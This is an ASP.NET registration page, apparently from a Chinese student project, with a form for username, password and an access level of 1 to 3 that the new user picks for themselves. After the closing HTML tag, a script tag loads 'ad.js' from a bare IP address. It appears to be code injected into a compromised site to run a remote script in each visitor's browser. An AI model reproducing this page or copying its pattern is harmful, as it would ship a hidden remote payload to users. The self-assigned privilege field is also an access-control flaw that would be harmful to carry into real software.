<%@ Page Language="vb" AutoEventWireup="false" Codebehind="newcustomer.aspx.vb" Inherits="relation.newcustomer"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>newcustomer</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<FORM id="Form1" method="post">
			<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
										href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="宋体"></FONT>
			<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <A href="index.aspx">
									首页</A></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
							<SPAN class="p9"><A href="index.aspx">用户登录</A></SPAN> |<A href="newcustomer.aspx">注册</A>
						</FONT>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
						<asp:Label id="lblHint" runat="server" ForeColor="Info">Label</asp:Label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff">
								<marquee scrollDelay="100" direction="left" behavior="scroll" loop="-1">欢迎您 
									&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
		</FORM>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
			&nbsp;&nbsp;
		</FORM>
		<FORM id="Form2" method="post" runat="server">
			<FONT face="宋体">
				<TABLE id="Table1" style="WIDTH: 569px; HEIGHT: 342px" cellSpacing="1" cellPadding="1"
					width="569" border="1">
					<TR>
						<TD><asp:label id="Label1" runat="server" Width="398px" Height="25px" ForeColor="#0000C0">用户名为2-20个字母或数字（区分大小写）；密码为6-20位字母数字或如下括号内字符（._-）；用户权限为1、2、3</asp:label>
							<TABLE id="tblReg" style="WIDTH: 472px; HEIGHT: 170px" cellSpacing="1" cellPadding="1"
								width="472" border="1">
								<TR>
									<TD style="WIDTH: 124px; HEIGHT: 27px"><asp:label id="lblName" runat="server">请输入用户名</asp:label></TD>
									<TD style="HEIGHT: 27px"><asp:textbox id="txtName" runat="server" Width="152px"></asp:textbox><asp:regularexpressionvalidator id="txtNameRegularExpressionValidator" runat="server" Width="176px" Height="14px"
											ErrorMessage="！输入用户名不符合要求" ValidationExpression="[a-zA-Z0-9]{2,20}" ControlToValidate="txtName"></asp:regularexpressionvalidator></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 124px; HEIGHT: 24px"><asp:label id="lblPwd" runat="server">请输入密码</asp:label></TD>
									<TD style="HEIGHT: 24px"><asp:textbox id="txtPwd" runat="server" Width="152px" TextMode="Password"></asp:textbox><asp:regularexpressionvalidator id="txtPwdRegularExpressionValidator" runat="server" ErrorMessage="！输入密码不符合要求" ValidationExpression="[\w\._-]{6,20}"
											ControlToValidate="txtPwd"></asp:regularexpressionvalidator></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 124px"><asp:label id="lblConfirm" runat="server">请确认输入密码</asp:label></TD>
									<TD><asp:textbox id="txtConfirm" runat="server" Width="152px" TextMode="Password"></asp:textbox><asp:regularexpressionvalidator id="txtConfirmRegularExpressionValidator" runat="server" ErrorMessage="！输入密码不符合要求"
											ValidationExpression="[\w\._-]{6,20}" ControlToValidate="txtConfirm"></asp:regularexpressionvalidator></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 124px"><asp:label id="lblAccPri" runat="server" Width="112px">请输入用户权限</asp:label></TD>
									<TD><asp:textbox id="txtAccPri" runat="server"></asp:textbox>
										<asp:RegularExpressionValidator id="txtAccPriRegularExpressionValidator" runat="server" ControlToValidate="txtAccPri"
											ValidationExpression="[123]" ErrorMessage="！输入权限不符合要求"></asp:RegularExpressionValidator></TD>
								</TR>
								<TR>
									<TD style="WIDTH: 124px"><asp:button id="btnAdd" runat="server" Text="添加"></asp:button></TD>
									<TD><asp:button id="btnCancel" runat="server" Text="撤销"></asp:button></TD>
								</TR>
							</TABLE>
							<asp:label id="lblWarning" runat="server" ForeColor="#0000C0">提醒：两次输入密码不一样，请重新输入</asp:label></TD>
					</TR>
				</TABLE>
			</FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63710939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
